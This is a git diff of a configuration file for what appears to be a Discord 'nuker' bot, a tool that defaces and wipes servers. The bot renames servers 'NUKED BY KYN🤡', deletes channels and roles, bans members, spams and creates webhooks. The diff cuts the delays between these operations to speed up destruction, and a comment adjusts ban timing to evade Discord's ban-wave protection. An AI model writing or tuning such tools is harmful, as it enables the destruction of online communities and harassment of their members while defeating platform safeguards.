@@ -11,7 +11,7 @@ module.exports = {
 
     nuker: {
         token: process.env.TOKEN_NUKER,
-        allowedUserIds: ['1284886248330231891', '1360301293872091136', '1340617218542800916'],
+        allowedUserIds: ['1284886248330231891', '1330130004931121224', '123'],
         whitelistedServerIds: ['1366020454795579496', '123'],
         serverIcon: 'https://cdn.discordapp.com/avatars/1284886248330231891/d483984f4119be0f7ad1a7b892bf0d37.png',
         serverName: 'NUKED BY KYN🤡',
@@ -27,16 +27,16 @@ module.exports = {
         ],
         spamRounds: 200,
         timing: {
-            channelCreateDelay: 300,
-            channelDeleteDelay: 300,
-            roleCreateDelay: 500,
-            roleDeleteDelay: 500,
-            banDelay: 1000,
-            messageDeleteDelay: 500,
-            webhookCreateDelay: 500,
-            serverEditDelay: 500,
-            spamRoundDelay: 300,
-            initialOperationDelay: 3000
+            channelCreateDelay: 10,
+            channelDeleteDelay: 10,
+            roleCreateDelay: 20,
+            roleDeleteDelay: 20,
+            banDelay: 100,                  // (keep a little higher for bans to avoid Discord ban wave protection)
+            messageDeleteDelay: 20,
+            webhookCreateDelay: 20,
+            serverEditDelay: 300,           // (leave this slightly higher)
+            spamRoundDelay: 20,
+            initialOperationDelay: 500      // (start quicker)        
         },
         behavior: {
             createChannels: true,
